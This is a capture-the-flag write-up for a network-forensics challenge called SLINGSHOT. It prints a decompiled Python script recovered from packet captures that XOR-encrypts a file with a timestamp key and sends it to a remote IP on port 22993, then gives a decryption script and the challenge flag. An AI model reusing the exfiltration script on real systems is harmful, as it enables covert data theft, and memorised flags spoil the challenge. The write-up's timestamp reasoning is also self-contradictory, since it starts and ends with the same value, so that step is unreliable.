## SLINGSHOT

### Oppgave



*PS: Hele oppgaven finnes [her](challenge.md)*

### Løsning

Exporting files from all packets in Wireshark will result in many files called %, etc and one called download.pyc
This file can be decompiled to python using [PyLingual](https://pylingual.io/view_chimera?identifier=b8c58f248600bfa1f83337bd7bb8f6f5a64a16219e56db0e3a2257ca23afc623):

```py
# Source timestamp: 2024-09-17 17:47:38 UTC (1726595258)
import sys
import socket
import time
import math

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
file = sys.argv[1]
ip = sys.argv[2]
port = 22993

with open(file, 'rb') as r:
    data_bytes = r.read()

current_time = time.time()
current_time = math.floor(current_time)
key_bytes = str(current_time).encode('utf-8')
init_key_len = len(key_bytes)
data_bytes_len = len(data_bytes)
temp1 = data_bytes_len // init_key_len
temp2 = data_bytes_len % init_key_len
key_bytes *= temp1
key_bytes += key_bytes[:temp2]
encrypt_bytes = bytes((a ^ b for a, b in zip(key_bytes, data_bytes)))

s.connect((ip, port))
s.send(encrypt_bytes)
```

The program connects to some ip using port `22993`. Follow the TCP stream for traffic at this port in Wireshark to get the output from the python program. The python program can now be reversed with ChatGPT to get the original file.
There is only one problem. The timestamp for when the program was run is needed to decrypt the message. What we have so far is the timestamp for when the file was created.

To get the correct timestamp first try the timestamp `1726595769` and look at the output. The output is very close to correct, but there are some wierd artifacts. We just need to adjust one number at the time until the words of the file are readably correct. We end up with the timestamp `1726595769`:

```py
import socket

# Open file
with open("dump2.bin", 'rb') as f:
    encrypted_bytes = f.read()

# Timestamp
key_bytes = "1726595769".encode('utf-8')
init_key_len = len(key_bytes)
data_bytes_len = len(encrypted_bytes)
temp1 = data_bytes_len // init_key_len
temp2 = data_bytes_len % init_key_len
key_bytes *= temp1
key_bytes += key_bytes[:temp2]

# Decrypt using XOR
decrypted_bytes = bytes((a ^ b for a, b in zip(key_bytes, encrypted_bytes)))

# Optionally, save the decrypted data to a file
with open("flag.png", 'wb') as f:
    f.write(decrypted_bytes)
```

This creates an image with the flag printed on to it-.

<details>
<summary>Flagg</summary>

`PCTF{1f_y0o_41n7_f1r57_y0ur3_l457}`
</details>